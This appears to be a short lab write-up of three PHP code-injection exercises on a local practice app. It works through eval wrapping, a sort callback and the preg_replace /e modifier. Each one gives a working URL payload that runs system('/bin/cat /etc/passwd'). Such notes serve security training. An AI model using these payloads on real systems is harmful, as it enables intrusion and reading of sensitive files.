# Code Injection

## 1

In this example, the input is simply wrapped inside an `eval` call.

`http://localhost:31337/codeexec/example1.php?name=%22.system%28%22/bin/cat%20/etc/passwd%22%29.%22`

## 2

This gets a little more complex, as we have to manipulate a callback to include the string command we want as an argument.

`http://localhost:31337/codeexec/example2.php?order=name, system('/bin/cat%20/etc/passwd')`

## 3

This is a really cool one that I didn't know about.

`http://localhost:31337/codeexec/example3.php?new=system%28%22/bin/cat%20/etc/passwd%22%29&pattern=/sloth/e&base=sloth`

The key is in the `e` modifier passed in to `preg_replace`, which causes the result to be evaluated as PHP code.

Explanation:

https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace
